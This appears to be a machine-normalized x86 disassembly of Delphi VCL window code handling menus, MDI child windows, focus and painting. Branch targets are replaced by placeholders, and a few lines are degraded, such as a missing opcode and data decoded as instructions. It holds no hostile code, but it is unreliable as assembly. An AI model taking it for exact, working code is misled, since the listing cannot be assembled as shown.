mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4cc
call sub_403a1c
mov eax ebx
call sub_444c6c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_444968
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45838c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458621
lea eax [ ebp - 0x10 ]
call sub_403fe0
retn
mov dl 0x1
mov eax ebx
call sub_459518
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax ebx
call sub_444c6c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_444968
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_444968
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_444968
mov edx eax
mov eax esi
call sub_451f64
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_444968
push eax
call SetMenu
sub_45863c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458628
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_458698
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_45868c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_458704
push ebx
mov ebx eax
mov eax ebx
call sub_443f80
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4586ec
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4586ec
mov edx eax
mov eax ebx
call sub_43e2ec
mov edx 0xff00000f
mov eax ebx
call sub_43e2ec
pop ebx
retn
sub_458788
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_444968
push eax
call ShowWindow
sub_4587c8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4581e0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_4581e0
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45bc54
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45bc40
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_4581e0
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45bc54
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45bc40
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b928
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b95c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b928
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b95c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b928
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b95c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b910
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b95c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b944
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45bc40
call sub_45b928
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_458b1c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4560d0
mov edx esi
mov eax edi
call sub_45b4c0
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_458bcb ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44178c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44178c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_458d2d
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4560e0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_444968
push eax
call SendMessageA
mov eax ebx
call sub_45968c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_444968
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43db50
push eax
mov eax ebx
call sub_43db94
push eax
mov eax ebx
call sub_444968
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406a40
mov [ ebx + 0x254 ] eax
push ebx
push sub_457c78
call sub_41a4bc
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44ea18
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_444968
push eax
call SetWindowPos
jmp r-xdata
sub_458e7a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_458fa5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_441af0
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45b398
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458fac
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_458fb4
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_441d5c
push 0x0
mov eax ebx
call sub_444968
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_458ff8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4424e0
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_444968
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_444968
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45905c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_459104
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45910b
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax edi
call sub_4553f0
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40348c
mov eax ebx
call sub_459414
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40348c
test al al
jne r-xdata
sub_459114
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_441444
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_441444
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45905c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45915c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45905c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_459180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_413bb8
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_413af0
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_413bb8
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_413af0
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_4593f0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_444968
mov dx 0xb000
call sub_4551b8
test al al
jne r-xdata
call sub_444968
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4551b8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4593f7
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403ac8
jmp r-xdata
call sub_403ac8
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_441444
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_444968
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4551b8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43f334
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
call sub_403ac8
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_444968
mov dx 0xb01a
call sub_4551b8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403ac8
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43f334
sub_459414
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43f334
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_444968
push eax
call SetFocus
mov eax ebx
call sub_444968
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_459464
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43f334
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_459518
mov eax esi
call sub_459414
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_444d90
mov edx eax
mov eax esi
call sub_45905c
sub_4594c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4580e0
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43f334
mov eax ebx
call sub_4580e0
mov edx esi
call sub_4594c8
sub_459518
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_452544
mov edx esi
call sub_452528
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4595c0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_444968
push eax
call SendMessageA
sub_45960c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4595c0
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45963c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4595c0
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4596a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d39c
xor eax eax
push ebp
push sub_459756
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41d800
xor eax eax
push ebp
push sub_459733
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45973a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41d800
retn
sub_459764
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_4580e0
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_458114
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40348c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_443c30
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_458160
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40348c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_459804
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_444968
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_45968c
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_444968
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_442af8
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_459882
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41cf48
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4598e4
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_444968
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_442dbc
pop edi
pop esi
retn
sub_459930
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
